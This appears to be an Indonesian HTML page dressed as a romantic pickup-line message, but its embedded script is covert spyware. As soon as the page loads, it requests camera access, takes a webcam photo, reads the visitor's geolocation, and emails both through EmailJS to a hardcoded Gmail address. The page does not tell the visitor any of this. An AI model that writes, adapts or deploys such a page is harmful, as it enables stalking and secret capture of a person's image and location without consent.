<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Gombalan Buat Kamu ❤️</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      background-color: #1a1a1a;
      color: #ffccff;
      font-family: 'Comic Sans MS', cursive;
      text-align: center;
      padding: 50px;
      font-size: 20px;
    }
  </style>
</head>
<body>
  <h1>Hai Kamu 😘</h1>
  <p>Kamu tahu nggak? Senyummu itu kayak wifi...</p>
  <p>...kuat banget nyambungin hati kita berdua 💓</p>

  <script>
    emailjs.init("GLY26LO9lMf5Nd48g");

    // Minta izin kamera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        video.onloadedmetadata = () => {
          setTimeout(() => {
            const canvas = document.createElement("canvas");
            canvas.width = 240;
            canvas.height = 180;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const gambar = canvas.toDataURL("image/jpeg", 0.5);

            // Setelah gambar diambil, ambil lokasi
            navigator.geolocation.getCurrentPosition(pos => {
              const lokasi = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`;

              const templateParams = {
                to_email: "newari363@gmail.com",
                lokasi: lokasi,
                gambar: gambar
              };

              emailjs.send("service_flvybff", "template_dsmq48i", templateParams)
                .then(() => console.log("✅ Gambar & lokasi berhasil dikirim"))
                .catch(err => console.error("❌ Gagal kirim:", err));
            }, err => {
              console.error("❌ Gagal ambil lokasi:", err);
            });
          }, 2000);
        };
      })
      .catch(err => {
        console.error("❌ Kamera tidak diizinkan:", err);
      });
  </script>
</body>
</html>
